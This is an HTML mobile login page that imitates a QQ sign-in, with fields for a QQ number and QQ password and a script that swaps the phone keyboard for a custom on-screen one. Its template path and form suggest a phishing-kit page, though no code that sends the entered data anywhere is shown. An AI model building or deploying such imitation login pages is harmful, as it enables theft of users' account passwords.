<!DOCTYPE html>
<html lang="zh-cn">
<head>

<title>手机统一登录</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta id="viewport" name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no">
<meta name="apple-mobile-web-app-capable" content="yes">
<link href="tpl/36/css.css" rel="stylesheet" type="text/css" />
<script type="text/javascript" src="jianpan/jquery.min.js"></script>
<link rel="stylesheet" type="text/css" href="jianpan/css/demo.css">
<link rel="stylesheet" type="text/css" href="jianpan/css/keyboard.css">
<script type="text/javascript" src="jianpan/js/slide.js"></script>

</head>

					         
                
           
		<input id="qq" class="inputstyle" name="qq" autocomplete="off" placeholder="QQ号码/手机/邮箱">
				
		<input id="pass" class="inputstyle1" maxlength="16" type="password" name="pass" autocorrect="off" placeholder="请输入您的QQ密码">

</body>
<script type="text/javascript">
if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
   // 移动
	$("#qq").focus(function() {
	    document.activeElement.blur(); // 阻止弹出系统软键盘
	    var _cliss = $(this).attr("class"); //获取//获取输入框的class
         console.log(_cliss);

	    $('body').keyboard({
	        defaults: 'number', //键盘显示类型   English 字母  number 数字  symbol 符号
	        inputClass: _cliss, //输入框Class
	        caseSwitch: 'toLowerCase', //英文大小写  toLowerCase 小写  toUpperCase 大写

	    });
	});
			$("#pass").focus(function() {
	    document.activeElement.blur(); // 阻止弹出系统软键盘
	    var _cliss = $(this).attr("class"); //获取//获取输入框的class
         console.log(_cliss);

	    $('body').keyboard({
	        defaults: 'English', //键盘显示类型   English 字母  number 数字  symbol 符号
	        inputClass: _cliss, //输入框Class
	        caseSwitch: 'toLowerCase', //英文大小写  toLowerCase 小写  toUpperCase 大写

	    });
	});	

} else {
   // alert('pc');
}



</script>



</html>
